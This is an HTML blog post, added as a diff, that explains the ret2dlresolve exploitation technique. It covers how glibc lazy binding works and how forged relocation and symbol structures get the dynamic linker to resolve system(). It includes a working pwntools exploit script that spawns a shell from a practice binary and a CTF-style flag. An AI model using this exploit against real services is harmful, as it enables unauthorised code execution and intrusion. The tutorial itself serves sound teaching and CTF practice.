@@ -1,0 +1,186 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#060606" media="(prefers-color-scheme: dark)">
+<meta name="theme-color" content="#f3f3f3" media="(prefers-color-scheme: light)">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>ret2dlresolve — a shell with no libc leak — algoatson.github.io</title>
+<meta name="description" content="When you can&#x27;t leak libc, make the dynamic linker resolve system() for you. Forge a relocation, a symbol, and a string, point the lazy-binding machinery at them, and _dl_runtime_resolve looks up the address you couldn&#x27;t.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/ret2dlresolve-no-leak/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dlresolve — a shell with no libc leak — algoatson.github.io">
+<meta property="og:description" content="When you can&#x27;t leak libc, make the dynamic linker resolve system() for you. Forge a relocation, a symbol, and a string, point the lazy-binding machinery at them, and _dl_runtime_resolve looks up the address you couldn&#x27;t.">
+<meta property="og:url" content="https://algoatson.github.io/p/ret2dlresolve-no-leak/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/ret2dlresolve-no-leak.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="preload" href="/assets/vga.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "ret2dlresolve — a shell with no libc leak", "datePublished": "2026-05-10", "dateModified": "2026-05-10", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "When you can't leak libc, make the dynamic linker resolve system() for you. Forge a relocation, a symbol, and a string, point the lazy-binding machinery at them, and _dl_runtime_resolve looks up the address you couldn't.", "url": "https://algoatson.github.io/p/ret2dlresolve-no-leak/", "mainEntityOfPage": "https://algoatson.github.io/p/ret2dlresolve-no-leak/", "keywords": "pwn, rop, internals"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/series/">series</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>ret2dlresolve — a shell with no libc leak</h1>
+  <div class="meta"><span>2026-05-10</span><span>3 min read</span><a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/rop/">rop</a> <a class="tag" href="/tags/internals/">internals</a></div>
+</header>
+
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#how-lazy-binding-actually-works">how lazy binding actually works</a></li>
+<li><a href="#forge-the-three-structures">forge the three structures</a></li>
+<li><a href="#when-it-works-and-when-it-doesnt">when it works, and when it doesn't</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p>The usual ROP recipe needs a libc leak: dump a GOT entry, subtract an offset,
+compute <code class="highlight">system</code>. But what if the binary gives you no convenient leak primitive —
+no <code class="highlight">puts(puts@got)</code> gambit, nothing? On a lazy-bound binary you don't <em>need</em> one.
+The dynamic linker already knows where libc is, and it will resolve a symbol by
+name on demand. <a href="/p/finding-gadgets/">ret2dlresolve</a> makes it resolve <code class="highlight">system</code>
+for you.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./svc</span></figcaption><div class="target__grid"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>leak</dt><dd>none available</dd></div><div><dt>premise</dt><dd>lazy binding is on -&gt; _dl_runtime_resolve is reachable</dd></div></dl><ul class="target__mits"><li class="m-meh"><span class="g" aria-hidden="true">≈</span><span class="mk">RELRO</span><span class="lead" aria-hidden="true"></span><span class="mv">partial</span></li><li class="m-off"><span class="g" aria-hidden="true">✗</span><span class="mk">PIE</span><span class="lead" aria-hidden="true"></span><span class="mv">off</span></li></ul></div></figure>
+<h2 id="how-lazy-binding-actually-works">how lazy binding actually works<a class="headerlink" href="#how-lazy-binding-actually-works" title="Permanent link">#</a></h2>
+<p>The first time you call <code class="highlight">foo@plt</code>, its GOT slot still points back into the PLT,
+which pushes a <em>relocation index</em> and jumps to the resolver:</p>
+<figure class="codeblock"><figcaption><span class="fname">the lazy-bind chain</span><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#the-lazy-bind-chain-1"> 1</a></span>
+<span class="normal"><a href="#the-lazy-bind-chain-2"> 2</a></span>
+<span class="normal"><a href="#the-lazy-bind-chain-3"> 3</a></span>
+<span class="normal"><a href="#the-lazy-bind-chain-4"> 4</a></span>
+<span class="normal"><a href="#the-lazy-bind-chain-5"> 5</a></span>
+<span class="normal"><a href="#the-lazy-bind-chain-6"> 6</a></span>
+<span class="normal"><a href="#the-lazy-bind-chain-7"> 7</a></span>
+<span class="normal"><a href="#the-lazy-bind-chain-8"> 8</a></span>
+<span class="normal"><a href="#the-lazy-bind-chain-9"> 9</a></span>
+<span class="normal"><a href="#the-lazy-bind-chain-10">10</a></span>
+<span class="normal"><a href="#the-lazy-bind-chain-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="the-lazy-bind-chain-1">call foo@plt
+</span><span id="the-lazy-bind-chain-2">└ jmp *foo@got            # still points back into PLT on first call
+</span><span id="the-lazy-bind-chain-3">  └ push reloc_index
+</span><span id="the-lazy-bind-chain-4">    push link_map
+</span><span id="the-lazy-bind-chain-5">    jmp _dl_runtime_resolve(link_map, reloc_index)
+</span><span id="the-lazy-bind-chain-6">        ├ rela = JMPREL + reloc_index*sizeof(Elf64_Rela)   # .rel.plt entry
+</span><span id="the-lazy-bind-chain-7">        ├ sym  = SYMTAB[ rela-&gt;r_info &gt;&gt; 32 ]              # .dynsym entry
+</span><span id="the-lazy-bind-chain-8">        ├ name = STRTAB + sym-&gt;st_name                     # .dynstr string
+</span><span id="the-lazy-bind-chain-9">        ├ addr = lookup(name)        # &lt;-- the linker finds it in libc, no leak
+</span><span id="the-lazy-bind-chain-10">        ├ *(rela-&gt;r_offset) = addr   # cache into GOT
+</span><span id="the-lazy-bind-chain-11">        └ jmp addr                   # and call it
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>Every input to that walk is just <em>memory at a computed offset</em>. Nothing is
+signed, nothing is authenticated — the resolver trusts that <code class="highlight">reloc_index</code> lands
+on a real <code class="highlight">Elf64_Rela</code>. So point it somewhere you control.</p>
+<h2 id="forge-the-three-structures">forge the three structures<a class="headerlink" href="#forge-the-three-structures" title="Permanent link">#</a></h2>
+<p>In a writable region with a known address — on a no-PIE binary the <code class="highlight">.bss</code> is
+fixed — lay down a fake relocation, a fake symbol, and the string <code class="highlight">&quot;system&quot;</code>,
+then pass an index that makes <code class="highlight">JMPREL + index*24</code> land on your fake <code class="highlight">Rela</code>:</p>
+<figure class="codeblock"><figcaption><span class="fname">staged in .bss (addresses known: no PIE)</span><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#staged-in-bss-addresses-known-no-pie-1">1</a></span>
+<span class="normal"><a href="#staged-in-bss-addresses-known-no-pie-2">2</a></span>
+<span class="normal"><a href="#staged-in-bss-addresses-known-no-pie-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="staged-in-bss-addresses-known-no-pie-1">fake_rela:  r_offset = &amp;got_slot   r_info = (fake_sym_idx &lt;&lt; 32 | R_X86_64_JUMP_SLOT)
+</span><span id="staged-in-bss-addresses-known-no-pie-2">fake_sym:   st_name  = &amp;&quot;system&quot; - STRTAB   (+ st_info etc.)
+</span><span id="staged-in-bss-addresses-known-no-pie-3">str:        &quot;system\0&quot;
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>Then ROP: set <code class="highlight">rdi = &amp;&quot;/bin/sh&quot;</code>, push your crafted index, and jump to the PLT
+resolver stub (<code class="highlight">PLT[0]</code>). The linker reads <em>your</em> <code class="highlight">Rela</code> → <em>your</em> <code class="highlight">Sym</code> →
+<code class="highlight">&quot;system&quot;</code>, looks it up in the real libc wherever ASLR put it, and calls it:</p>
+<figure class="codeblock"><figcaption><span class="fname">dlresolve.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#dlresolvepy-1"> 1</a></span>
+<span class="normal"><a href="#dlresolvepy-2"> 2</a></span>
+<span class="normal"><a href="#dlresolvepy-3"> 3</a></span>
+<span class="normal"><a href="#dlresolvepy-4"> 4</a></span>
+<span class="normal"><a href="#dlresolvepy-5"> 5</a></span>
+<span class="normal"><a href="#dlresolvepy-6"> 6</a></span>
+<span class="normal"><a href="#dlresolvepy-7"> 7</a></span>
+<span class="normal"><a href="#dlresolvepy-8"> 8</a></span>
+<span class="normal"><a href="#dlresolvepy-9"> 9</a></span>
+<span class="normal"><a href="#dlresolvepy-10">10</a></span>
+<span class="normal"><a href="#dlresolvepy-11">11</a></span>
+<span class="normal"><a href="#dlresolvepy-12">12</a></span>
+<span class="normal"><a href="#dlresolvepy-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="dlresolvepy-1"><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="dlresolvepy-2"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./svc&quot;</span><span class="p">)</span>
+</span><span id="dlresolvepy-3">
+</span><span id="dlresolvepy-4"><span class="hll"><span class="n">dl</span> <span class="o">=</span> <span class="n">Ret2dlresolvePayload</span><span class="p">(</span><span class="n">elf</span><span class="p">,</span> <span class="n">symbol</span><span class="o">=</span><span class="s2">&quot;system&quot;</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">])</span>
+</span></span><span id="dlresolvepy-5"><span class="hll"><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+</span></span><span id="dlresolvepy-6"><span class="hll"><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">ret</span><span class="p">)</span>                       <span class="c1"># alignment</span>
+</span></span><span id="dlresolvepy-7"><span class="hll"><span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">dl</span><span class="o">.</span><span class="n">data_addr</span><span class="p">)</span>              <span class="c1"># stage the fake structs into .bss</span>
+</span></span><span id="dlresolvepy-8"><span class="n">rop</span><span class="o">.</span><span class="n">ret2dlresolve</span><span class="p">(</span><span class="n">dl</span><span class="p">)</span>                  <span class="c1"># push index, jump to PLT[0]</span>
+</span><span id="dlresolvepy-9">
+</span><span id="dlresolvepy-10"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./svc&quot;</span><span class="p">)</span>
+</span><span id="dlresolvepy-11"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fit</span><span class="p">({</span><span class="n">offset</span><span class="p">:</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()}))</span>
+</span><span id="dlresolvepy-12"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">dl</span><span class="o">.</span><span class="n">payload</span><span class="p">)</span>                <span class="c1"># the forged Rela/Sym/str</span>
+</span><span id="dlresolvepy-13"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<details class="spoiler">
+<summary>shell, and the GOT never had system in it</summary>
+<p>No leak, no libc version guess — the linker did the lookup. <code class="highlight">system(&quot;/bin/sh&quot;)</code>:
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1">segfault{the_linker_resolved_it_for_me}
+</span></code></pre></div></td></tr></table></div>
+</figure></p>
+</details>
+<h2 id="when-it-works-and-when-it-doesnt">when it works, and when it doesn't<a class="headerlink" href="#when-it-works-and-when-it-doesnt" title="Permanent link">#</a></h2>
+<ul>
+<li><strong>Lazy binding must be on.</strong> <strong>Full RELRO</strong> resolves every symbol at startup and
+  read-onlys the GOT, so <code class="highlight">_dl_runtime_resolve</code> is never used at runtime — this whole
+  technique is dead. Partial RELRO / no RELRO keep it alive.</li>
+<li><strong>You need a known writable address</strong> to stage the fakes. No-PIE hands you <code class="highlight">.bss</code>;
+  with PIE you need a leak first, which somewhat defeats the point.</li>
+<li><strong>Modern glibc bounds-checks the symbol index</strong> against the real <code class="highlight">.dynsym</code> size,
+  so the giant-index trick needs care (keep the fake structures <em>close</em> to the real
+  tables, or use the version that stays in bounds). pwntools picks a working layout
+  for the common cases; exotic ones you craft by hand.</li>
+</ul>
+<p>ret2dlresolve is the answer to "I have a ROP chain but no leak." You're not
+beating ASLR — you're asking the one component that's exempt from it, the dynamic
+linker, to hand you the address it already knows.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><div class="row"><span class="row__date">2026-05-22</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/srop-one-syscall-every-register/">SROP — one syscall, every register</a><span class="row__min">3 min</span></div><div class="row"><span class="row__date">2026-05-12</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/finding-gadgets/">finding gadgets: ROPgadget, ropper, one_gadget, pwntools</a><span class="row__min">5 min</span></div><div class="row"><span class="row__date">2026-03-15</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/the-stack-canary-from-the-source/">the stack canary, from the source</a><span class="row__min">4 min</span></div></div></section>
+<nav class="pager"><a class="prev" href="/p/finding-gadgets/"><span class="lbl">&#8249; newer</span>finding gadgets: ROPgadget, ropper, one_gadget, pwntools</a><a class="next" href="/p/pwndbg-muscle-memory/"><span class="lbl">older &#8250;</span>pwndbg muscle memory</a></nav></main>
+
+    <footer class="status">
+      <span>36 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h2>keys</h2><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
